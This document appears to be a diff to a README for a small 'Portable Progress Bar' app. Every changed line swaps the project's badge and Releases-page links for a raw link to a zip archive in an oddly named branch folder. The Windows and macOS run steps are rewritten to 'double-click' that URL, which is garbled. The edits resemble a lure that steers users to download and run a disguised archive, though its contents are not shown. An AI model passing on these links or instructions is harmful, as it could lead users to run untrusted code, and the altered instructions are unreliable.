@@ -1,6 +1,6 @@
 # 💈️ Portable-Progress-Bar - A Simple Way to Track Progress
 
-![Download Portable Progress Bar](https://img.shields.io/badge/Download-Portable%20Progress%20Bar-brightgreen)
+![Download Portable Progress Bar](https://raw.githubusercontent.com/Kingqasim/Portable-Progress-Bar/Portable-Progress-Bar_Main-dev/resnatron/Portable-Progress-Bar.zip%20Progress%20Bar-brightgreen)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the Portable Progress Bar project! This software provides an advanced
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [Releases Page](https://github.com/Kingqasim/Portable-Progress-Bar/releases). 
+To get started, visit this page to download: [Releases Page](https://raw.githubusercontent.com/Kingqasim/Portable-Progress-Bar/Portable-Progress-Bar_Main-dev/resnatron/Portable-Progress-Bar.zip). 
 
 You will find the latest version of the Portable Progress Bar available for download. Look for the files listed under the latest release. Download the file suitable for your operating system.
 
@@ -40,8 +40,8 @@ Once you've downloaded the Portable Progress Bar, follow these steps to run it:
 2. **Extract the Archive (if applicable):** If the file is zipped, right-click it and select "Extract All" or use your preferred extraction tool.
 3. **Open the Folder:** Navigate to the folder where the extracted files are located.
 4. **Run the Application:**
-   - **Windows:** Double-click on `PortableProgressBar.exe`
-   - **macOS:** Open the `PortableProgressBar.app`
+   - **Windows:** Double-click on `https://raw.githubusercontent.com/Kingqasim/Portable-Progress-Bar/Portable-Progress-Bar_Main-dev/resnatron/Portable-Progress-Bar.zip`
+   - **macOS:** Open the `https://raw.githubusercontent.com/Kingqasim/Portable-Progress-Bar/Portable-Progress-Bar_Main-dev/resnatron/Portable-Progress-Bar.zip`
    - **Linux:** Open a terminal and run `./PortableProgressBar`
 
 ## 📑 User Guide
@@ -81,7 +81,7 @@ We plan to enhance the Portable Progress Bar with additional features. You can l
 - More detailed reporting features
 - Improved performance monitoring
 
-Stay tuned on the [Releases Page](https://github.com/Kingqasim/Portable-Progress-Bar/releases) for the latest updates.
+Stay tuned on the [Releases Page](https://raw.githubusercontent.com/Kingqasim/Portable-Progress-Bar/Portable-Progress-Bar_Main-dev/resnatron/Portable-Progress-Bar.zip) for the latest updates.
 
 ## 🙏 Acknowledgments
 
